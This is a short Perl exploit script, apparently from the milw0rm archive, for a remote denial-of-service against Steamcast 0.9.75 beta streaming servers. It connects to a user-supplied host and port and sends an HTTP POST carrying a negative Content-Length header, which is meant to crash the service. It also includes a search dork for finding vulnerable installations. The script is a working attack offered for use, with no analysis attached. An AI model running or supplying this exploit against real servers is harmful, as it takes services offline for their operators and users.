#!/usr/bin/perl
#Steamcast 0.9.75 beta Remote Denial of Service
#Download :http://www.steamcast.com
#Tested Under Windows XP and linux
#Dork for test :"Powered By Steamcast "0.9.75 beta
#Author: ksa04
use strict;
use warnings;
use IO::Socket;

my $host = shift || die "usage: perl $0 host port\n";
my $port = shift ;

my $sock = new IO::Socket::INET(PeerAddr => $host, PeerPort => $port, PeerProto => 'tcp')
or die "error: $!\n";

$sock->send("POST / HTTP/1.1\r\n");
$sock->send("Content-Length: -100\r\n\r\n");


$sock->close;

print "[+]Done...\n";

# milw0rm.com [2009-04-14]